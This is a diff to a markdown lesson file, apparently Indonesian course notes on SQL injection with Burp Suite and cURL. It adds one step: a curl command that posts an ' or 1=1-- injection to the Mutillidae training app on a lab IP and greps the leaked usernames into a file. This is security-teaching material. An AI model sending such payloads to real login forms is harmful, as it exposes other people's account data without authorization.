@@ -80,7 +80,8 @@ Lesson 7 - SQL Injection, Burpsuite, cURL, Perl Parser
  
  ![](/assets/lesson-7/VirtualBox_kali_19_12_2017_18_08_20.png)
 
- - **Step 3** : Jalankan perintah  
+ - **Step 3** : Jalankan perintah 
+ `curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+or+1%3D1--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://10.151.36.64/mutillidae/index.php" | grep "Username=" > lesson7.txt`
  
  
  
